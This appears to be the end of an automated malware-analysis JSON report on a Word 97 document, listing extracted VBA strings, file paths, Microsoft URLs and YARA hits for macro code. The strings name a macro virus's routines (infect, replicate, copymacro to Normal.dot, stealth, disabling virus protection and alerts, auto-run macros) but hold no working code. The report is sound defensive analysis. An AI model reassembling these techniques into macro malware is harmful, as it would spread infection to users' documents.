            "newUnitsu",
            "newValpl",
            "ConvertUnitsToInches",
            "oldUnits",
            "PrettyMeasurement",
            "theVal",
            "theUnits",
            "LTrim$'q",
            "RightDistanceToLeftDistance<",
            "fromEdgeInchescc",
            "fromEdgeDef\u059b",
            "dlgPgl",
            "FilePageSetup",
            "PageWidth!",
            "InsertRedSlot",
            "ToolsOptionsViewP",
            "FieldCodes",
            "CharLeft",
            "CharRightP",
            "SubstituteBananas(",
            "letterIndex",
            "DoStyleMerge",
            "EditBookmarkf",
            "DlgText$_",
            "EditClear",
            "InsertPara",
            "InsertDateTime\\",
            "WW6_EditClear0",
            "DlgValue",
            "WW7_EditAutoTextC",
            "ParseRetAddress\ti",
            "LDone",
            "SetAddressf",
            "nmh^",
            "AddressText",
            "Ltemp",
            "Rtemp",
            "ErrorSetAddress",
            "GetAddress$",
            "SetAddressContinue?",
            "DlgTextht",
            "DlgFocusk",
            "DlgEnable",
            "CommandValid",
            "RmTrailingLFsH",
            "tString",
            "EndOfRmTrailingLFs5d",
            "TwoPageHack",
            "WW7_InsertPageBreak_;",
            "EndOfDocument",
            "DifferentFirstPageo",
            "ViewHeader\u072a",
            "ViewNormal5",
            "ViewFooteriU",
            "InsertPageField",
            "EditSelectAll",
            "CreateLetter",
            "recpAddress>",
            "DateTabPlace",
            "LBadMeasurement\u04a8",
            "TopMargini",
            "LDoneLetterhead:",
            "DlgFilePreview\u068d",
            "FormatTabs\u0569",
            "ClearAll",
            "StartOfDocument",
            "LPrewrittenContinue",
            "ViewPageJ",
            "ViewZoomO",
            "PickStylePreviewJ",
            "FooterDistancek",
            "LStyleMissing0",
            "FormatStyleGallery\u07da",
            "DlgUpdateFilePreview}",
            "LContinue1",
            "tempR",
            "NextState9",
            "oldStateY",
            "LetterMethodP",
            "UseLetterhead",
            "PrevState",
            "UpdateHeadingPosition\\O",
            "lhpNew(",
            "DoButtonClick",
            "fnameR",
            "ItemFocusChanged",
            "woldj",
            "GetAutoText$",
            "SaveDialogS",
            "SaveDlgValPref",
            "SaveDlgPref8",
            "SaveDlgMultiLinePref}",
            "RstDialoge",
            "RstDlgValPref",
            "RstDlgPreff",
            "RstDlgMultiLinePref",
            "wind",
            "fBadDoc",
            "howser",
            "DisableInputS",
            "FileNameFromWindow$",
            "IsMacro|",
            "Selection$",
            "DisableAutoMacros",
            "FileNewDefault\t",
            "dlgPgSetup1q",
            "dlgPgSetup2r",
            "Orientation",
            "CentimetersToPoints",
            "PageHeight\t",
            "NoError",
            "xStorePrefJ",
            "val_",
            "SetPrivateProfileString=",
            "Environ",
            "GetPrivateProfileString$x",
            "defaultValH",
            "nerr",
            "TooBigZ",
            "rdvpexitV$",
            "defaultStr",
            "idx\u04dd",
            "count_Q8",
            "howMany2",
            "EnableControls{\t",
            "SHControlst",
            "FirstField&8",
            "LimFieldF",
            "iField)",
            "DlgVisibleU",
            "EnabFieldsv",
            "ChangeStateE",
            "sold",
            "snewt",
            "DlgControlf",
            "iactionC~",
            "wvalueh",
            "fRet",
            "idnum>",
            "DlgControlId",
            "fFound",
            "wdUserTemplatesPath",
            "FileFind",
            "SearchPath",
            "strWIZ\tU",
            "SubDir+",
            "MatchCase",
            "CountFoundFiles",
            "wdWorkgroupTemplatesPath%;",
            "FoundFileName$o",
            "PathSeparator",
            "LWizardMissingi(",
            "ErrorCode0e",
            "ErrObjectx",
            "lErrorCode=I",
            "ResetWizardEnvironment",
            "fBalloonVisible",
            "objAssistantBalloonE",
            "lAssistantId",
            "EndWizard{",
            "NewMacrosj",
            "infectf",
            "DisplayAlerts",
            "wdAlertsNone",
            "Animation",
            "msoAnimationGetTechy",
            "getnormalYm",
            "deletenormal3)",
            "OrganizerRename",
            "SourceG",
            "NormalTemplateq",
            "FullName\u041e",
            "NewName#",
            "wdOrganizerObjectProjectItems",
            "copymacro8",
            "ecoA",
            "OrganizerCopy",
            "replicateR",
            "RndR",
            "AttachedTemplate",
            "AutoNew\\3",
            "runmacro",
            "AutoClose",
            "autoopen*",
            "AutoExit",
            "ToolsMacrou",
            "restoreoriginald",
            "wdDialogToolsMacroHS",
            "recopyW",
            "OrganizerDelete!",
            "reren8",
            "wdProgramPath",
            "virusflag",
            "VirusProtectionoD",
            "OpenAsDocument .",
            "rme.",
            "Run_",
            "stealth",
            "_B_var_d",
            "_B_var_virusflagF",
            "_B_var_a",
            "aB?w/z1`K",
            " Autom ation",
            "MSForms",
            "932022-F",
            "D69-11D2 -89E9",
            "4B2921DE",
            "2.TWD#M",
            "icrosoft ",
            "^ Ob",
            " LibraryG",
            "O3*OIP\\VHBE\\",
            "(EX'(",
            "vN@TalvNSa@w",
            " @+\tB,",
            "eOffic\u0107O",
            "G{2D",
            "F8D04C-5",
            "BFA-101B -BDE5",
            "ePRO",
            "GRAM FIL",
            "ES\\MICRO",
            "SOFT OFF",
            "ICE\\",
            "MSO97.DLLj#P 8.0",
            "hisDocum",
            "A@1T",
            " UC01",
            "K NewMa!n",
            "N JwP",
            "a`Kr 0s0$]",
            "*\\CNormalrU",
            "ThisDocument",
            "UC01",
            "UF01",
            "UM01",
            "Project",
            "Module1",
            "NewMacros",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB",
            "Word",
            "C:\\WIN95\\SYSTEM\\STDOLE2.TLB",
            "stdole",
            "C:\\WIN95\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "C:\\WIN95\\TEMP\\VBE\\MSForms.EXD",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL",
            "Office",
            "infect",
            "deletenormal",
            "copymacro",
            "replicate",
            "AutoNew",
            "AutoClose",
            "autoopen",
            "AutoExit",
            "ToolsMacro",
            "restoreoriginal",
            "recopy",
            "reren",
            "getnormal",
            "runmacro",
            "stealth",
            "AutoClose",
            "PortNumber",
            "Printer Port",
            "prncfg.ini",
            "windot.dll",
            "wininf.dll",
            "VBA332.DLL",
            "Help me",
            "Heading",
            "I'm not feeling very vell .. AAARGHH!!!",
            "Text",
            "Show",
            "Normal.dot",
            "NewMacros",
            "Normal.oldNewMacros.",
            "btnBackup",
            "\u0351e\teQ.",
            "_AQ1`PNS\u0351e\teQR!hck",
            "\\R!hck",
            "vX[0R ",
            "veeN-N",
            "0\u0351e\teQ",
            "NO_ ",
            "PNeN-N\teQR!hck",
            "btnClose",
            "btnRestore",
            "Label1@",
            "Microsoft Forms 2.0 Form",
            "Embedded Object",
            "VERSION 5.00",
            "Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} UF01 ",
            "   Caption         =   \"\u06f0\u02ae\u0565u\u3db0\"",
            "   ClientHeight    =   1560",
            "   ClientLeft      =   45",
            "   ClientTop       =   330",
            "   ClientWidth     =   5970",
            "   StartUpPosition =   1  'CenterOwner",
            "   TypeInfoVer     =   316",
            "ThisDocument",
            "UC01",
            "UF01",
            "UM01",
            "NewMacros",
            "ID=\"{DB77EEA2-A489-11D1-BA1D-444553540000}\"",
            "Document=ThisDocument/&H00000000",
            "Class=UC01",
            "Package={AC9F2F90-E877-11CE-9F68-00AA00574A4F}",
            "BaseClass=UF01",
            "Module=UM01",
            "Module=NewMacros",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"2E2C9ACEE6D210D610D610D610D6\"",
            "DPB=\"5C5EE83C386B396B396B\"",
            "GC=\"8A883E126D136D1392\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "UC01=22, 22, 335, 277, ",
            "UF01=0, 0, 0, 0, C, 44, 44, 360, 298, C",
            "UM01=0, 0, 0, 0, C",
            "NewMacros=0, 0, 0, 0, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "21)R3.Mov": "Video",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB": "Autogen",
            "VBA332.DLL": "Library",
            "save normal.dot to windot.dll": "Library",
            "user32.dll": "Library",
            "windot.dll": "Library",
            "wininf.dll": "Library",
            "zard.txt": "Text"
        },
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.microsoft.com/isapi/redir.dll?",
            "http://www.microsoft.com/isapi/redir.dll?PRD=Word&SBP=ia&PVER=8.0&AR=templates"
        ]
    },
    "time": "0:00:02.780824",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
